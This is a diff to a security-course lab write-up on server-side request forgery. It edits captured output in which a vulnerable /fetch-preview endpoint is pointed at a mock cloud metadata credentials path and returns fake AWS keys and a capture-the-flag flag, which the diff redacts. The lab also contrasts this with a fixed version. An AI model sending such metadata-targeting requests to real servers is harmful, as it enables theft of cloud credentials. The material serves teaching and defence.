@@ -78,8 +78,8 @@ host against the published ports. Real captured output:
 ```
 === VULNERABLE (no URL validation on /fetch-preview) (http://localhost:8104) ===
 [*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
-    -> 200 {'body': '{"AccessKeyId":"ASIAFAKEACCESSKEYID00","Code":"Success","Expiration":"2024-01-01T06:00:00Z","LastUpdated":"2024-01-01T00:00:00Z","SecretAccessKey":"fAkE/SecretAccessKey/ThatLooksReal000000","Token":"FAKE.SESSION.TOKEN.FOR.TEACHING.PURPOSES.ONLY","Type":"AWS-HMAC","flag":"FLAG{ssrf_steals_the_instance_role}"}\n', 'status': 'fetched', 'status_code': 200, 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
-PASS: SSRF via /fetch-preview leaked instance-role credentials, flag = FLAG{ssrf_steals_the_instance_role}
+    -> 200 {'body': '{"AccessKeyId":"ASIAFAKEACCESSKEYID00","Code":"Success","Expiration":"2024-01-01T06:00:00Z","LastUpdated":"2024-01-01T00:00:00Z","SecretAccessKey":"fAkE/SecretAccessKey/ThatLooksReal000000","Token":"FAKE.SESSION.TOKEN.FOR.TEACHING.PURPOSES.ONLY","Type":"AWS-HMAC","flag":"FLAG{...}"}\n', 'status': 'fetched', 'status_code': 200, 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
+PASS: SSRF via /fetch-preview leaked instance-role credentials, flag = FLAG{...}
 
 === FIXED (blocks metadata-shaped/internal URLs) (http://localhost:8117) ===
 [*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
@@ -99,7 +99,7 @@ lesson's `docker-compose.yml` in this repo at the time of writing.
 
 Per-student flag: run `python3 instructor/seed_flags.py env <STUDENT_ID>` — this course's own
 `instructor/seed_flags.py` already exists and already mints this lesson's `ec2` flag (keys now come from the course manifest via the centralized tooling, not a hand-maintained CHALLENGES list).
-Without it, `FLAG_EC2` defaults to `FLAG{ssrf_steals_the_instance_role}` and can be overridden:
+Without it, `FLAG_EC2` falls back to a shared placeholder that is the same for everyone and can be overridden:
 `FLAG_EC2=FLAG{...} docker compose up`.
 
 **Evidence artifact.** The attributable evidence is the captured `flag` value inside the fetched
